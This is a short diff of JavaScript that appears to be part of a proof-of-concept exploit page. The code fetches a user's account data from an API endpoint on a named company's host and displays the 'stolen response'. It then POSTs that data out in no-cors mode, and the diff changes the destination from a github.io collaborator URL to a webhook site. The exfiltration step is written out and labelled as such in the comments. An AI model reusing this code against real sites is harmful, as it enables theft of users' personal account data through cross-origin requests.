@@ -16,8 +16,8 @@ fetch("https://advisortimetracker.kkr.com/api/v1/me", {
   // Show stolen response
   document.getElementById("out").textContent = data;
 
-  // Exfiltrate to collaborator
-  fetch("https://bigzooooz.github.io/collaborator/", {
+  // Exfiltrate to webhook
+  fetch("https://d90c361b-91e4-4399-8c78-7b57e7743bca.webhooksite.net", {
     method: "POST",
     mode: "no-cors",
     body: data
